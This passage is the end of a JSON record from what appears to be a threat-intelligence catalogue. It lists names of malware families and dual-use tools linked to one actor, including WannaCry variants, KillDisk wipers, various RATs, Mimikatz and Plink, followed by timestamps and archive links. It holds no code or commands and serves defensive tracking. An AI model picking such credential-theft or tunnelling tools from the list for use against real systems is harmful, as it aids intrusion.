                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1675476497,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1675165933,
    "ts_modification_date": 1675165938,
    "files": {
        "pdf": "https://archive.orkl.eu/1dee7a6195d27712adf1cf29121fcfcdbb070942.pdf",
        "text": "https://archive.orkl.eu/1dee7a6195d27712adf1cf29121fcfcdbb070942.txt",
        "img": "https://archive.orkl.eu/1dee7a6195d27712adf1cf29121fcfcdbb070942.jpg"
    }
}